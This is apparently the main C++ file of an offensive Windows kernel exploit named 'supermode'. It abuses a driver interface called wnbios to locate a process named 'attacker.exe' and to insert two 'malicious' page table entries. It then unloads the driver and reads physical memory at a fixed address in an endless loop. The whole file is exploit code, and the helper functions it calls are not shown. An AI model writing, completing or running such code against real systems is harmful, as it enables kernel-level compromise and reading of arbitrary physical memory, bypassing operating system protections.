#include "supermode.h"

int main()
{
	supermode::wnbios.get_process_base("attacker.exe");
	supermode::insert_first_malicious_pte();
	supermode::insert_second_malicious_pte();

	// i cannot believe but we are done here brotha
	supermode::wnbios.unload_driver();

	system("pause");

	byte buf[16] = { 0 };

	std::cout << "Reading from phys 0x1ad000 from now on...\n";

	while (true)
	{
		supermode::read_physical_memory(0x1ad000, 15, (uint64_t*)buf);
		Sleep(10);
	}

	return 1;
}